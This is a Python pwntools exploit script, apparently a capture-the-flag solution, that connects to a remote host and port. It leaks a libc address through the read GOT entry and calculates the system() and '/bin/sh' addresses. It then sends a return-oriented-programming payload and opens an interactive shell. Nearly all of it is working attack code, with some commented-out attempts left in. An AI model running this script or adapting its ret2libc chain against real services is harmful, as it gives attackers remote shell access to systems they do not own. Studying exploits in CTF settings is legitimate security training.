#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11004

yuan = remote(host , port)


read_plt = 0x4005b0
read_got = 0x601028
printf_plt = 0x4005a0
printf_got = 0x601020
memcpy_plt = 0x4005f0
libc_read_offset = 0x00000000000f69a0
#libc_read_offset = 0x557b
libc_system_offset = 0x0000000000045380
bin_sh_offset = 0x18c58b
#pop_rdi = 0x4008c3
#4008c3
pop_rdi_libc_offset = 0x0000000000021102
pppp = 0x279cb # pop    %rdi;pop    %r8;add    $0x68,%rsp;pop    %rbx;pop    %rbp;pop    %r12;;pop    %r13;pop    %r14;pop    %r15;retq

yuan.sendline("6295592")
#yuan.sendline("6295584")

yuan.recvuntil('x')
saddr = yuan.recvuntil('\n')
print saddr
iaddr = int(saddr,16)
print iaddr

readaddr = hex(iaddr)
print readaddr

libc_addr = iaddr - libc_read_offset

systemaddr = libc_addr + libc_system_offset
print 'System_addr: ' , hex(systemaddr)

bin_sh_addr = libc_addr + bin_sh_offset

p2 = p64(bin_sh_addr)
p2 += p64(systemaddr)
p2 += p64(0x1) * 5
p2 += p64(0x0000000000021102 + libc_addr)

#p = p64(bin_sh_addr)
p = p64(iaddr)*7
"""
p = p64(systemaddr)
p += p64(systemaddr)
p += p64(systemaddr)
#p += p64(0x123213)
#p += p64(0x0) * 1
p += p64(systemaddr)
p += p64(systemaddr)
p += p64(systemaddr)
p += p64(systemaddr)
"""
p += p64(0x0000000000021102 + libc_addr)
p += p64(bin_sh_addr)
p += p64(systemaddr)
#p += p64(0x400773)
#p += p64(bin_sh_addr)
#p += p64(systemaddr)
#p += p32(0x0)
#p += p64(bin_sh_addr)

yuan.sendline(p)
#yuan.sendline("ls")
yuan.interactive()

